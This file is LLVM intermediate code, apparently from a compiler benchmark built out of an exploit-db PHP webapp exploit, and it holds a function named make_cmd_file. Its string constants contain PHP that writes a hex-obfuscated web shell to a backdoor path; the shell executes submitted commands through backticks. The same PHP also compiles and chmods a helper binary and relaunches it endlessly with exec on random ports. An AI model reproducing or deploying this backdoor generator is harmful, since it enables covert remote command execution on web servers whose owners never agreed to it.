; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/php/webapps/extr_982.c_make_cmd_file.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/php/webapps/extr_982.c_make_cmd_file.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@CMD_FILE = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [2 x i8] c"w\00", align 1
@.str.1 = private unnamed_addr constant [1007 x i8] c"<?\0Achdir('../../');\0A\0Aif(($fp=fopen('%s','r'))!=NULL)\0A{\0A$pnum=fread($fp,32);\0Afclose($fp);\0A$pnum=str_replace(\22\\n\22,\22\22,$pnum);\0Aif(($fp=fopen('/proc/'.$pnum.'/stat','r'))!=NULL)\0A{\0Aexit;\0A}\0A}\0A\0A$cont=\22\\x3c\\x3f\\x0a\\x09\\x65\\x63\\x68\\x6f\\x20\\x27\\x3c\\x46\22.\0A\22\\x4f\\x52\\x4d\\x20\\x41\\x43\\x54\\x49\\x4f\\x4e\\x3d\\x24\22.\0A\22\\x50\\x48\\x50\\x5f\\x53\\x45\\x4c\\x46\\x20\\x4d\\x45\\x54\22.\0A\22\\x48\\x4f\\x44\\x3d\\x50\\x4f\\x53\\x54\\x3e\\x27\\x3b\\x0a\22.\0A\22\\x09\\x65\\x63\\x68\\x6f\\x20\\x27\\x3c\\x49\\x4e\\x50\\x55\22.\0A\22\\x54\\x20\\x54\\x59\\x50\\x45\\x3d\\x48\\x49\\x44\\x44\\x45\22.\0A\22\\x4e\\x20\\x4e\\x41\\x4d\\x45\\x3d\\x63\\x6d\\x64\\x20\\x56\22.\0A\22\\x41\\x4c\\x55\\x45\\x3d\\x24\\x63\\x6f\\x6d\\x6d\\x61\\x6e\22.\0A\22\\x64\\x3e\\x3c\\x2f\\x46\\x4f\\x52\\x4d\\x3e\\x3c\\x50\\x52\22.\0A\22\\x45\\x3e\\x27\\x3b\\x0a\\x09\\x24\\x63\\x6f\\x6d\\x6d\\x61\22.\0A\22\\x6e\\x64\\x3d\\x73\\x74\\x72\\x5f\\x72\\x65\\x70\\x6c\\x61\22.\0A\22\\x63\\x65\\x28\\x27\\x5c\\x5c\\x27\\x2c\\x27\\x27\\x2c\\x24\22.\0A\22\\x63\\x6f\\x6d\\x6d\\x61\\x6e\\x64\\x29\\x3b\\x0a\\x09\\x65\22.\0A\22\\x63\\x68\\x6f\\x20\\x60\\x24\\x63\\x6f\\x6d\\x6d\\x61\\x6e\22.\0A\22\\x64\\x60\\x3b\\x0a\\x3f\\x3e\\x0a\22;\0A\0A$fp=fopen('%s','w');\0Afputs($fp,$cont);\0Afclose($fp);\0A\0A\00", align 1
@PRC_FILE = common dso_local global i8* null, align 8
@BACKDOOR_PATH = common dso_local global i8* null, align 8
@CODE_PATH = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.3 = private unnamed_addr constant [8 x i8] c"$cont=\22\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c"\\x%02x\00", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"\22;\0A\0A\00", align 1
@.str.6 = private unnamed_addr constant [54 x i8] c"$fp=fopen('%s','w');\0Afputs($fp,$cont);\0Afclose($fp);\0A\0A\00", align 1
@CODE_PATH_SRC = common dso_local global i8* null, align 8
@.str.7 = private unnamed_addr constant [23 x i8] c"$RES=`gcc -o %s %s`;\0A\0A\00", align 1
@.str.8 = private unnamed_addr constant [19 x i8] c"chmod('%s',0755);\0A\00", align 1
@.str.9 = private unnamed_addr constant [34 x i8] c"if(($fp=fopen('%s','r'))!=NULL){\0A\00", align 1
@.str.10 = private unnamed_addr constant [14 x i8] c"echo \22%s\\n\22;\0A\00", align 1
@MAKE_STR1 = common dso_local global i8* null, align 8
@.str.11 = private unnamed_addr constant [17 x i8] c"} fclose($fp);\0A\0A\00", align 1
@MAKE_STR2 = common dso_local global i8* null, align 8
@.str.12 = private unnamed_addr constant [21 x i8] c"$fnum=(rand()%%%d);\0A\00", align 1
@TARGET_NUM = common dso_local global i32 0, align 4
@.str.13 = private unnamed_addr constant [21 x i8] c"$snum=(rand()%%%d);\0A\00", align 1
@SEARCH_NUM = common dso_local global i32 0, align 4
@.str.14 = private unnamed_addr constant [24 x i8] c"$randnum=(rand()%400);\0A\00", align 1
@.str.15 = private unnamed_addr constant [12 x i8] c"while(1)\0A{\0A\00", align 1
@.str.16 = private unnamed_addr constant [166 x i8] c"if(($fp=fopen('%s','r'))!=NULL)\0A{\0A$pnum=fread($fp,32);\0Afclose($fp);\0A$pnum=str_replace(\22\\n\22,\22\22,$pnum);\0Aif(($fp=fopen('/proc/'.$pnum.'/stat','r'))!=NULL)\0A{\0Aexit;\0A}\0A}\0A\0A\00", align 1
@.str.17 = private unnamed_addr constant [24 x i8] c"$port=(rand()%%65500);\0A\00", align 1
@.str.18 = private unnamed_addr constant [17 x i8] c"if($port>1024){\0A\00", align 1
@.str.19 = private unnamed_addr constant [54 x i8] c"exec(\22./%s -t $fnum -p $port -s $snum -q $randnum\22);\0A\00", align 1
@.str.20 = private unnamed_addr constant [5 x i8] c"}\0A}\0A\00", align 1
@.str.21 = private unnamed_addr constant [4 x i8] c"?>\0A\00", align 1
@DELT_STR1 = common dso_local global i8* null, align 8
@DELT_STR2 = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @make_cmd_file() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i64, align 8
  %3 = alloca i32*, align 8
  %4 = alloca i32*, align 8
  store i64 0, i64* %2, align 8
  %5 = load i8*, i8** @CMD_FILE, align 8
  %6 = call i32* @fopen(i8* %5, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0))
  store i32* %6, i32** %3, align 8
  %7 = icmp eq i32* %6, null
  br i1 %7, label %8, label %9

8:                                                ; preds = %0
  store i32 -1, i32* %1, align 4
  br label %109

9:                                                ; preds = %0
  %10 = load i32*, i32** %3, align 8
  %11 = load i8*, i8** @PRC_FILE, align 8
  %12 = load i8*, i8** @BACKDOOR_PATH, align 8
  %13 = call i32 (i32*, i8*, ...) @fprintf(i32* %10, i8* getelementptr inbounds ([1007 x i8], [1007 x i8]* @.str.1, i64 0, i64 0), i8* %11, i8* %12)
  %14 = load i8*, i8** @CODE_PATH, align 8
  %15 = call i32* @fopen(i8* %14, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  store i32* %15, i32** %4, align 8
  %16 = icmp eq i32* %15, null
  br i1 %16, label %17, label %18

17:                                               ; preds = %9
  store i32 -1, i32* %1, align 4
  br label %109

18:                                               ; preds = %9
  %19 = load i32*, i32** %3, align 8
  %20 = call i32 (i32*, i8*, ...) @fprintf(i32* %19, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i64 0, i64 0))
  br label %21

21:                                               ; preds = %25, %18
  %22 = load i32*, i32** %4, align 8
  %23 = call i64 @fread(i64* %2, i32 1, i32 1, i32* %22)
  %24 = icmp ne i64 %23, 0
  br i1 %24, label %25, label %29

25:                                               ; preds = %21
  %26 = load i32*, i32** %3, align 8
  %27 = load i64, i64* %2, align 8
  %28 = call i32 (i32*, i8*, ...) @fprintf(i32* %26, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0), i64 %27)
  br label %21

29:                                               ; preds = %21
  %30 = load i32*, i32** %4, align 8
  %31 = call i32 @fclose(i32* %30)
  %32 = load i32*, i32** %3, align 8
  %33 = call i32 (i32*, i8*, ...) @fprintf(i32* %32, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0))
  %34 = load i32*, i32** %3, align 8
  %35 = load i8*, i8** @CODE_PATH, align 8
  %36 = call i32 (i32*, i8*, ...) @fprintf(i32* %34, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.6, i64 0, i64 0), i8* %35)
  %37 = load i8*, i8** @CODE_PATH_SRC, align 8
  %38 = call i32* @fopen(i8* %37, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  store i32* %38, i32** %4, align 8
  %39 = icmp eq i32* %38, null
  br i1 %39, label %40, label %41

40:                                               ; preds = %29
  store i32 -1, i32* %1, align 4
  br label %109

41:                                               ; preds = %29
  %42 = load i32*, i32** %3, align 8
  %43 = call i32 (i32*, i8*, ...) @fprintf(i32* %42, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i64 0, i64 0))
  br label %44

44:                                               ; preds = %48, %41
  %45 = load i32*, i32** %4, align 8
  %46 = call i64 @fread(i64* %2, i32 1, i32 1, i32* %45)
  %47 = icmp ne i64 %46, 0
  br i1 %47, label %48, label %52

48:                                               ; preds = %44
  %49 = load i32*, i32** %3, align 8
  %50 = load i64, i64* %2, align 8
  %51 = call i32 (i32*, i8*, ...) @fprintf(i32* %49, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0), i64 %50)
  br label %44

52:                                               ; preds = %44
  %53 = load i32*, i32** %4, align 8
  %54 = call i32 @fclose(i32* %53)
  %55 = load i32*, i32** %3, align 8
  %56 = call i32 (i32*, i8*, ...) @fprintf(i32* %55, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0))
  %57 = load i32*, i32** %3, align 8
  %58 = load i8*, i8** @CODE_PATH_SRC, align 8
  %59 = call i32 (i32*, i8*, ...) @fprintf(i32* %57, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.6, i64 0, i64 0), i8* %58)
  %60 = load i32*, i32** %3, align 8
  %61 = load i8*, i8** @CODE_PATH, align 8
  %62 = load i8*, i8** @CODE_PATH_SRC, align 8
  %63 = call i32 (i32*, i8*, ...) @fprintf(i32* %60, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.7, i64 0, i64 0), i8* %61, i8* %62)
  %64 = load i32*, i32** %3, align 8
  %65 = load i8*, i8** @CODE_PATH, align 8
  %66 = call i32 (i32*, i8*, ...) @fprintf(i32* %64, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.8, i64 0, i64 0), i8* %65)
  %67 = load i32*, i32** %3, align 8
  %68 = load i8*, i8** @BACKDOOR_PATH, align 8
  %69 = call i32 (i32*, i8*, ...) @fprintf(i32* %67, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.9, i64 0, i64 0), i8* %68)
  %70 = load i32*, i32** %3, align 8
  %71 = load i8*, i8** @MAKE_STR1, align 8
  %72 = call i32 (i32*, i8*, ...) @fprintf(i32* %70, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.10, i64 0, i64 0), i8* %71)
  %73 = load i32*, i32** %3, align 8
  %74 = call i32 (i32*, i8*, ...) @fprintf(i32* %73, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.11, i64 0, i64 0))
  %75 = load i32*, i32** %3, align 8
  %76 = load i8*, i8** @CODE_PATH, align 8
  %77 = call i32 (i32*, i8*, ...) @fprintf(i32* %75, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.9, i64 0, i64 0), i8* %76)
  %78 = load i32*, i32** %3, align 8
  %79 = load i8*, i8** @MAKE_STR2, align 8
  %80 = call i32 (i32*, i8*, ...) @fprintf(i32* %78, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.10, i64 0, i64 0), i8* %79)
  %81 = load i32*, i32** %3, align 8
  %82 = call i32 (i32*, i8*, ...) @fprintf(i32* %81, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.11, i64 0, i64 0))
  %83 = load i32*, i32** %3, align 8
  %84 = load i32, i32* @TARGET_NUM, align 4
  %85 = call i32 (i32*, i8*, ...) @fprintf(i32* %83, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.12, i64 0, i64 0), i32 %84)
  %86 = load i32*, i32** %3, align 8
  %87 = load i32, i32* @SEARCH_NUM, align 4
  %88 = call i32 (i32*, i8*, ...) @fprintf(i32* %86, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.13, i64 0, i64 0), i32 %87)
  %89 = load i32*, i32** %3, align 8
  %90 = call i32 (i32*, i8*, ...) @fprintf(i32* %89, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.14, i64 0, i64 0))
  %91 = load i32*, i32** %3, align 8
  %92 = call i32 (i32*, i8*, ...) @fprintf(i32* %91, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.15, i64 0, i64 0))
  %93 = load i32*, i32** %3, align 8
  %94 = load i8*, i8** @PRC_FILE, align 8
  %95 = call i32 (i32*, i8*, ...) @fprintf(i32* %93, i8* getelementptr inbounds ([166 x i8], [166 x i8]* @.str.16, i64 0, i64 0), i8* %94)
  %96 = load i32*, i32** %3, align 8
  %97 = call i32 (i32*, i8*, ...) @fprintf(i32* %96, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.17, i64 0, i64 0))
  %98 = load i32*, i32** %3, align 8
  %99 = call i32 (i32*, i8*, ...) @fprintf(i32* %98, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.18, i64 0, i64 0))
  %100 = load i32*, i32** %3, align 8
  %101 = load i8*, i8** @CODE_PATH, align 8
  %102 = call i32 (i32*, i8*, ...) @fprintf(i32* %100, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.19, i64 0, i64 0), i8* %101)
  %103 = load i32*, i32** %3, align 8
  %104 = call i32 (i32*, i8*, ...) @fprintf(i32* %103, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0))
  %105 = load i32*, i32** %3, align 8
  %106 = call i32 (i32*, i8*, ...) @fprintf(i32* %105, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.21, i64 0, i64 0))
  %107 = load i32*, i32** %3, align 8
  %108 = call i32 @fclose(i32* %107)
  br label %109

109:                                              ; preds = %52, %40, %17, %8
  %110 = load i32, i32* %1, align 4
  ret i32 %110
}

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @fprintf(i32*, i8*, ...) #1

declare dso_local i64 @fread(i64*, i32, i32, i32*) #1

declare dso_local i32 @fclose(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
